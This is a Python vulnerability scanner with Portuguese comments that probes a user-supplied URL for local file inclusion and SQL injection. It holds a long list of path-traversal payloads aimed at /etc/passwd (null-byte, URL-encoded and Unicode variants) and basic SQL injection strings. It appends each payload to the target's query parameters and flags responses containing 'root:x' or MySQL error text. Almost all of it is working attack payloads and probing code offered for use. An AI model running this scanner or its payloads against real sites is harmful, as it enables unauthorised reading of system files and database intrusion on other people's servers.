#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

# Criado por Deivid Willyan
# Testes Iniciais de SQL Injection, LFI .
# V0.1 - 27/01/2016
## Implantar futuramente Threading

###################################################################################################################

import urllib.request, os, sys

###################################################################################################################

lfi_array = ["/etc/passwd%00","../etc/passwd%00","../../etc/passwd%00","../../../etc/passwd%00","../../../../../etc/passwd%00","../../../../../../etc/passwd%00","../../../../../../../../etc/passwd%00","../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../../etc/passwd%00","/etc/passwd","../etc/passwd","../../etc/passwd","../../../etc/passwd","../../../../../etc/passwd","../../../../../../etc/passwd","../../../../../../../../../etc/passwd","../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../etc/passwd",
            "..\%20\..\%20\..\%20\../etc/passwd","..\..\..\..\..\..\..\..\..\..\etc\passwd",
            "....//....//....//....//....//....//....//....//....//....//etc/passwd",
            ".\\./.\\./.\\./.\\./.\\./.\\./etc/passwd",
            "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd","..//..//..//..//..//../etc/passwd",
            "..//..//..//..//..//..//..//etc//passwd",
            "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd","..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
            "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd",
            "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd","/.../.../.../.../.../%0a",
            "/../../../../../../../../%2A","..%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2fetc%2f%2fpasswd",
            "/../../../../../../../../../../etc/passwd^^","../\../\../\../\../\../\../\etc/\passwd",
            "...//...//...//...//...//...//etc//passwd",
            "/..\../..\../..\../..\../..\../..\../etc/passwd",
            "/./././././././././././etc/passwd",".../.../.../.../.../.../etc/passwd",
            "\.\.\.\.\.\.\.\.\etc\passwd",
            "/%00//%00//%00//%00//%00/etc/passwd","/%00//%00//%00//%00//%00/etc/passwd",
            "/%2e%2e\../%2e%2e\../%2e%2e\../%2e%2e\../%2e%2e\../%2e%2e\../etc/passwd",
            "..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63","..%%35c..%%35c..%%35c..%%35c..%%35c..%%35c",
            "..%25%35%63..%25%35%63..%25%35%63..%25%35%63..%25%35%63..%25%35%63etc%25%35%63passwd","..%255c..%255c..%255c..%255c..%255c..%255cetc%255cpasswd",
            "..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%5cpasswd","..%5c..%5c..%5c..%5c..%5c..%5c../etc/passwd",
            "..%bg%qf..%bg%qf..%bg%qf..%bg%qf..%bg%qf","..%bg%qf..%bg%qf..%bg%qf..%bg%qf..%bg%qfetc%bg%qfpasswd",
            "..%bg%qf..%bg%qf..%bg%qf..%bg%qfetc/passwd","../\.../\.../\.../\.../\.../\.../etc/passwd",
            "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",
            "..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215etc%u2215passwd",
            ".%5c../..%5c/..%c0%9v..%5c.%5c../..%5c/..%c0%9v../",
            "..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215etc%u2215passwd",
            "..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216etc%u2216passwd",
            "../\./\./\./\./\./\./\etc/\passwd"]

sql_array = ["\'", "\'or\' 1=1", "1\' or \'1\' = \'1\'"]

user_agent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7'
headers    = {'User-Agent':user_agent,} 

url = ""

##################################################################################################################

def Principal():
	
	os.system("reset")

	procuraHttp = url.find('http' or 'https')
	if procuraHttp < 0:
		print ("\033[01;31m\n[ERRO] O Site deve conter http:// \033[0m\n\n")
		sys.exit()

	retorno = url.find('=')
	if retorno < 0:
		urlVetor = [str(url)]
	else:
		urlcortada = url[:retorno + 1]
		urlVetor = [str(urlcortada), str(url)] 


################################################ LFI #############################################################
	
	print ("\n\033[01;31m                              +-------------------------------+ \033[0m")
	print ("\033[01;31m                              |  [ INICIANDO VARREDURA LFI ]  | \033[0m")
	print ("\033[01;31m                              +-------------------------------+ \033[0m\n")

	cont = 0
	for lfi in lfi_array:
		for urlLista in urlVetor:
			stringSql = urlLista + lfi

			try:

				request = urllib.request.Request(stringSql, None, headers)
				body = urllib.request.urlopen(request).read().decode('iso-8859-1' or 'utf-8')
		
				if ("root:x" in body): 
					print ("\033[01;37m [ LFI ] " + stringSql + " \033[0m")
					cont = cont + 1
					break
				break

			except :
				pass

	if (cont == 0):
		print ("\n\033[01;37m                            [ NENHUMA VULNERABILIDADE ENCONTRADA ]\033[0m\n")
			
############################################### SQLi ############################################################
	
	print ("\n\033[01;32m                              +-------------------------------+ \033[0m")
	print ("\033[01;32m                              |  [ INICIANDO VARREDURA SQL ]  | \033[0m")
	print ("\033[01;32m                              +-------------------------------+ \033[0m\n")

	cont = 0
	for sql in sql_array:
		for urlLista in urlVetor:			
			stringSql = urlLista + sql
			
			try:
				
				request = urllib.request.Request(stringSql, None, headers)
				body = urllib.request.urlopen(request).read().decode('iso-8859-1' or 'utf-8')
				
				if (("Warning") in body) or (("MySQL") in body) or (("syntax") in body): 
					print ("\033[01;37m[ SQL ] " + stringSql + " \033[0m")
					cont = cont + 1
										
			except :
				pass

	if (cont == 0):
		print ("\n\033[01;37m                           [ NENHUMA VULNERABILIDADE ENCONTRADA ]\033[0m")
	print()				

########################################## MENU PRINCIPAL ########################################################

try:
	url = sys.argv[1]

except :
	print("""\n\033[01;31m Exemplo de Uso   
		  ./MVul.py http://site.com/vul.php?id=10 \n\033[0m""")
	sys.exit()

Principal()
